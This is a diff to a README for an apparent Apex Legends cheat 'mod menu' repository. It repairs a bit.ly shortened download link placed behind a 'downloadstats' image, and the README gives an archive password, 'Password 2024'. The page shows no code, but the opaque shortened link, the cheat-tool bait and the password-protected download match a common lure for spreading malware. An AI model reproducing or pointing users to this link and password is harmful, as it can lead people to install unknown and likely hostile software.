@@ -1,5 +1,5 @@
 # RETRIVER-APEX-LEGENDS-MOD-MENU
-<p dir="auto"><a href="(https://bit.ly/3vF0PXY)"><img src="https://github.com/Patricia-Miller/NCk4e/assets/165694055/bcc9b4dd-dde6-416a-bb1d-e65601f43bb0" alt="downloadstats" secured-asset-link="" style="max-width: 100%;"></a></p>
+<p dir="auto"><a href="https://bit.ly/3vF0PXY"><img src="https://github.com/Patricia-Miller/NCk4e/assets/165694055/bcc9b4dd-dde6-416a-bb1d-e65601f43bb0" alt="downloadstats" secured-asset-link="" style="max-width: 100%;"></a></p>
 
 <blockquote>
 <p dir="auto">Password 2024</p>
